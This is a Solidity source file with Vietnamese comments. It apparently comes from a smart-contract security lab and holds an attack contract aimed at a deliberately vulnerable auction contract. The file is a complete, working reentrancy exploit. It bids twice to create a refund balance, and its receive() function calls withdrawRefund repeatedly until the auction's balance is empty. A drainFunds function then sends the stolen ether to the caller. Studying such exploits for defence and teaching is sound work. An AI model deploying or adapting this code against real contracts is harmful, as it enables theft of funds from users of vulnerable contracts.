// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Sửa lỗi 1: Import đúng tên file (VulnerableAuction.sol)
import "./SC08_VulnerableAuction.sol";
import "hardhat/console.sol";

// HỢP ĐỒNG TẤN CÔNG
contract AuctionAttack {
    Auction public auction; // Hợp đồng nạn nhân

    // Sửa lỗi 2: Thêm 'payable' trở lại
    constructor(address payable _auctionAddress) {
        auction = Auction(_auctionAddress);
    }

    // Hàm "mồi" để chuẩn bị tấn công
    function setupAttack() public payable {
        // 1. Trở thành người trả giá cao nhất với 1 ETH
        auction.bid{value: 1 ether}();
        console.log("Attack setup: Bid 1 ETH");

        // 2. Tự vượt mặt mình với 2 ETH
        // Việc này sẽ đẩy 1 ETH vào 'refunds'
        auction.bid{value: 2 ether}();
        console.log("Attack setup: Bid 2 ETH, 1 ETH now in refunds");
    }
    
    // Bắt đầu tấn công
    function attack() public {
        auction.withdrawRefund();
    }

    // Hàm receive() sẽ được gọi khi Auction gửi tiền hoàn lại
    receive() external payable {
        console.log("Attack contract received ether: ", address(this).balance);

        // Nếu hợp đồng Auction vẫn còn tiền, tiếp tục gọi lại `withdrawRefund()`
        if (auction.getBalance() > 0) {
            auction.withdrawRefund();
        }
    }

    // Rút tiền về ví của kẻ tấn công
    function drainFunds() public {
        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(success);
    }
}